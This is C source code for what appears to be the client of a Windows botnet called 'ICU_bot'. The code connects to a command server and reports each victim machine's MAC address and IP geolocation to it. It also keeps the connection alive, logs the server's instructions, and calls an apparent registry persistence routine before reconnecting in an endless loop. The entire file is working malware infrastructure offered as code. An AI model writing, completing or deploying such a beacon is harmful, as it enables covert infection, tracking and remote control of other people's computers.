#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <winsock2.h>

#include "ICU_bot.h"
#include "../stdlib/ICU_packet.h"
#include "../stdlib/ICU_ipgeo.h"
#include "../process/windowsprocess.h"
#include "../stdlib/ICU_log.h"

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096
#define CHECK_INTERVAL 10000

HANDLE botThreadHandle = NULL;
DWORD botThreadID;

DWORD WINAPI KeepAliveThread(LPVOID lpParam) {
    SOCKET sock = *(SOCKET*)lpParam;

    while (1) {
        Sleep(600000);

        if (keep_alive(sock) < 0) {
            errors_log("Failed to send keep-alive packet");
            break;
        } else {
            printf("Keep-alive sent.\n");
            info_log("Keep-alive sent.");
        }
    }

    return 0;
}

void bot_connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
    WSADATA wsaData;
    SOCKET sock;

    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int bytes_received;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        char socket_error[255];
        snprintf(socket_error, 255, "Failed to connect -> server. Code %d", WSAGetLastError());
        errors_log(socket_error);
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        char socket_error[255];
        snprintf(socket_error, 255, "Error creating socket. Code: %d", WSAGetLastError());
        errors_log(socket_error);

        WSACleanup();
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        char socket_error[255];
        snprintf(socket_error, 255, "Failed to connect -> server. Code %d", WSAGetLastError());
        errors_log(socket_error);

        closesocket(sock);
        WSACleanup();
        return;
    }

    char connection_info[255];
    snprintf(connection_info, 255, "Connect to server %s:%d success!", SERVER_ADDR, SERVER_PORT);
    info_log(connection_info);

    uint8_t mac[6];
    get_mac_address(mac);
    const char *ipgeo_json = ipgeo();

    if (hello_packet(sock, mac, ipgeo_json) < 0) {
        errors_log("Failed to hello send packet");
    }

    CreateThread(NULL, 0, KeepAliveThread, &sock, 0, NULL);

    while (1) {
        bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            errors_log("Failed to get bytes data");
            closesocket(sock);
            break;
        }

        char receive_data[4098];
        snprintf(receive_data, 4098, "DATA[%lu] %s", bytes_received, buffer);
        info_log(receive_data);
    }

    closesocket(sock);
    WSACleanup();
}

void is_server(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
    add_to_reestr();
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    while (1) {
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            Sleep(CHECK_INTERVAL);
            continue;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            Sleep(CHECK_INTERVAL);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        server.sin_addr.s_addr = inet_addr(SERVER_ADDR);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            bot_connection(SERVER_ADDR, SERVER_PORT);
        } else {
            closesocket(sock);
            WSACleanup();
            info_log("Couldn't connect to the server, reconnecting after 10 seconds...");
            Sleep(10000);
        }
    }
}
